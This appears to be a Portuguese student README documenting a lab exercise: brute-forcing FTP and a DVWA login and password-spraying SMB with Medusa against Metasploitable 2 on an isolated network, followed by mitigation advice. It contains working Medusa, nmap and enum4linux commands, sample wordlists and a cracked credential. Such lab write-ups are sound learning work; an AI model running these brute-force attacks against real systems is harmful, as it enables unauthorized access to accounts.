🔐 Ataques de Força Bruta com Medusa – Kali Linux, Metasploitable 2 e DVWA
<p align="center"> <img src="https://img.shields.io/badge/Kali%20Linux-Pentest-blue?style=for-the-badge&logo=kalilinux&logoColor=white" /> <img src="https://img.shields.io/badge/Medusa-Brute%20Force-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/Metasploitable-Vulnerable-orange?style=for-the-badge" /> <img src="https://img.shields.io/badge/DVWA-Web%20Security-green?style=for-the-badge" /> </p>

Este repositório documenta ataques de força bruta utilizando Kali Linux, Medusa, Metasploitable 2 e DVWA em um ambiente seguro e isolado.
O objetivo é entender técnicas ofensivas para aplicar defesas e fortalecer sistemas reais.

📌 1. Ambiente Utilizado
Máquinas Virtuais
Componente	Sistema	Função
Kali Linux	Atacante	Executa ferramentas
Metasploitable 2	Alvo	FTP, SMB vulneráveis
DVWA	Alvo Web	Login vulnerável
Rede (VirtualBox)

Host-Only

Comunicação apenas entre VMs

Ambiente seguro e controlado

Teste de conectividade
nmap -sn 192.168.56.0/24

🧰 2. Ferramentas utilizadas

Medusa

Nmap

Enum4Linux

DVWA

Metasploitable 2

Wordlists personalizadas

🧪 3. Ataques Realizados
📌 3.1 – Força Bruta em FTP
Scanner:
nmap -p 21 192.168.56.10

Wordlist (senhas.txt)
123456
password
admin
msfadmin
metasploitable

Ataque:
medusa -h 192.168.56.10 -u msfadmin -P senhas.txt -M ftp

Resultado:
ACCOUNT FOUND: User: msfadmin Password: msfadmin

📌 3.2 – Força Bruta Web (DVWA – LOW)
Acessar DVWA:
http://192.168.56.10/dvwa


Login inicial:

admin / password


Configurar:

DVWA Security → Low

Wordlist (senhas_web.txt)
123
admin
password
abc123
qwerty

Ataque:
medusa -h 192.168.56.10 \
 -u admin \
 -P senhas_web.txt \
 -M web-form \
 -m FORM:"dvwa/login.php":METHOD:POST:SUCCESS:"Welcome"

📌 3.3 – Password Spraying em SMB
Enumeração:
enum4linux -a 192.168.56.10 | grep "user"

Lista (users.txt)
msfadmin
user
guest
service

Wordlist (spray.txt)
password
msfadmin
123456

Ataque:
medusa -h 192.168.56.10 -U users.txt -P spray.txt -M smbnt

📁 4. Estrutura do Repositório
/projeto-medusa/
 ├── README.md
 ├── senhas.txt
 ├── senhas_web.txt
 ├── spray.txt
 ├── users.txt
 ├── /images/
 │     ├── ftp_attack.png
 │     ├── dvwa_attack.png
 │     ├── smb_spray.png

🛡️ 5. Medidas de Mitigação
FTP

Fail2ban

SFTP/SSH

Senhas fortes

Bloqueio de tentativas

Web

Captcha

MFA

Rate Limiting

WAF

SMB

Desativar SMBv1

Auditoria

Políticas de senha forte

🎯 Conclusão

O uso de Medusa em FTP, DVWA e SMB mostrou como ataques de força bruta podem comprometer ambientes vulneráveis. Esta prática reforça a importância de medidas preventivas e políticas de segurança bem definidas.

👤 Autor

Joao Guilherme Dias de Mello Costa.
Projeto de estudo em cibersegurança.




![Linux](https://img.shields.io/badge/Linux-Kali-blue?logo=linux)
![Medusa](https://img.shields.io/badge/Tool-Medusa-red)
![Nmap](https://img.shields.io/badge/Scanner-Nmap-yellow)
![Enum4Linux](https://img.shields.io/badge/SMB-Enum4Linux-blueviolet)
![DVWA](https://img.shields.io/badge/Web-DVWA-green)
![Metasploitable](https://img.shields.io/badge/OS-Metasploitable-orange)

